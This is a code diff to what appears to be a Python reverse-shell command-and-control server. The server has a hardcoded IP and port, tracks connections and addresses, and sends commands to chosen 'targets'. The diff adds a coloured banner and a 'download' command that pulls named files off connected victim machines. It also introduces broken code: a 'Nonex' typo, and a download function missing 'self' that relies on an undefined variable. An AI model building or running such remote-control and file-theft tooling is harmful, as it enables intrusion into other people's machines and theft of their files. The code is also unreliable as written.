@@ -11,7 +11,7 @@ NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
 
-print("""                        ▄▄▌   ▄▄▄·  ▄▄ • ▄• ▄▌ ▐ ▄ ▄▄▄ .
+print(Fore.BLUE + """                        ▄▄▌   ▄▄▄·  ▄▄ • ▄• ▄▌ ▐ ▄ ▄▄▄ .
                         ██•  ▐█ ▀█ ▐█ ▀ ▪█▪██▌•█▌▐█▀▄.▀·
                         ██▪  ▄█▀▀█ ▄█ ▀█▄█▌▐█▌▐█▐▐▌▐▀▀▪▄
                         ▐█▌▐▌▐█ ▪▐▌▐█▄▪▐█▐█▄█▌██▐█▌▐█▄▄▌
@@ -32,7 +32,7 @@ class MultiServer(object):
     def __init__(self):
         self.host = '167.114.69.183'
         self.port = 49153
-        self.socket = None
+        self.socket = Nonex
         self.all_connections = []
         self.all_addresses = []
 
@@ -45,6 +45,16 @@ class MultiServer(object):
         signal.signal(signal.SIGINT, self.quit_gracefully)
         signal.signal(signal.SIGTERM, self.quit_gracefully)
         return
+
+    def download():
+        filename = raw_input("filename")
+        f = open(filename, 'wb')
+        c.send(filename)
+        i = c.recv(1024)
+        while not ('complete' in str(i)):
+            f.write(i)
+            i = c.recv(1024)
+        f.close()
 
     def quit_gracefully(self, signal=None, frame=None):
         print('\nQuitting gracefully')
@@ -111,6 +121,10 @@ class MultiServer(object):
                 target, conn = self.get_target(cmd)
                 if conn is not None:
                     self.send_target_commands(target, conn)
+            elif str(cmd) == "download":
+                download()
+                continue
+
             elif cmd == 'shutdown':
                     queue.task_done()
                     queue.task_done()
